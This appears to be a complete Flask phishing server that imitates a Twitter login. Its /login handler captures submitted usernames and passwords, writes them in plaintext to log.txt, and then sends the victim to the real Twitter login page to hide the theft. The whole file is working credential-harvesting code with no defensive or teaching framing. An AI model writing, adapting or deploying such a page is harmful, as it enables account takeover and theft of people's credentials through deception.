from flask import Flask, render_template, request, redirect
import os
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("log.txt", "a") as file:
        file.write(f"{datetime.now()} - Username: {username}, Password: {password}\n")
    return redirect("https://twitter.com/login")  # fake redirect

if __name__ == "__main__":
    app.run(debug=True)
